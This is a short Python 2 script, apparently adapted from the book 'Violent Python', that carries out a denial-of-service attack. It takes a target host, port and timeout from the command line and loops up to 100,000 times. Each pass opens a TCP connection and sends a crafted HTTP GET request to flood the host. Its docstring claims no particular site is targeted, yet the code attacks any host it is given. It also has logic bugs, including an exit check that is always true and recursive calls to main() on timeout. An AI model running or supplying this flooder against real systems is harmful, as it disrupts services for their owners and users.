#!/usr/bin/env python2
# written by Moses Arocha
# Written with the help of TJ O'Connor in his book "Violent Python"


import socket
import sys 
import optparse

"""
This script demostrates Denial of service(DoS) attack.The script does not intent to target any webiste.
The scripts accepts one argument, which is the host to be passed.
run the script like python dos.py www.somedomain.com
"""
msg="+++++++++++++++++"

def start_dos(PortAttack, TimeoutDuration):
	
	try:
		attack_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM) #socket definition
		attack_socket.connect((sys.argv[1],PortAttack)) #connect the socket to host across port 80
		#set the default timeout make it as minimum as possible inorder to keep flooding the site.
		socket.setdefaulttimeout(TimeoutDuration)
		print "Host and port of attacking site", attack_socket.getpeername()		
 		attack_socket.send("GET /" + msg + " HTTP/1.1\r\n")
		attack_socket.send("Host: " + sys.argv[1]+ "\r\n\r\n"); 
# Catch the exception for general socket error  & timeout error 
#since the script aims at continous attack catch the exception of keyboard Interrupt.
	except socket.error, message: print "Socket not created" 
	except socket.timeout:
		attack_socket.close()
		main()
	except (KeyboardInterrupt):
		usr_input=raw_input("Enter q or Q to end the script")
		if usr_input =='q' or 'Q':
			sys.exit()
	attack_socket.close()
def main():
	parser = optparse.OptionParser("Usages For Program: <IP Address/URL> -p <Port Number> -t <Timeout>")
	parser.add_option("-p", "--Port", dest ="port", type="int", help="Specify Port Number", default=80)
	parser.add_option("-t", "--Timeout", dest="timeout", type="float", help="Specify Timeout Duration", default=0.2)
	(options, args) = parser.parse_args(sys.argv)
	if options.port == None:
		print parser.usage
		exit(0)
	if options.timeout == None:
		print parser.usage
		exit(0)
	PortAttack = options.port
	TimeoutDuration = options.timeout
	print "DOS Has started"
	for i in range(1,100000):
		print "Attack No :",i
		start_dos(PortAttack, TimeoutDuration)

if __name__=='__main__':		
	main()
